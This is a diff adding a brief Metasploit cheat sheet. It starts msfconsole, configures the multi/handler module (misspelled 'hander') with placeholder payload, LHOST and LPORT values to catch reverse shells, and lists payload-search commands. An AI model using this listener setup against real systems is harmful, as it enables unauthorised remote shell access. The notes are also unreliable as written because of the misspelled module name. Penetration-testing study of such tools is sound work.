@@ -1,0 +1,15 @@
+
+
+$msfconsole
+$use exploit/multi/hander
+$set PAYLOAD payloadname
+$set LHOST ip_address
+$set LPORT port
+$ exploit
+
+#search for payloads
+$search payloadname
+#shows all the payloads
+$show payloads 
+#shows advanced payloads
+$show advanced
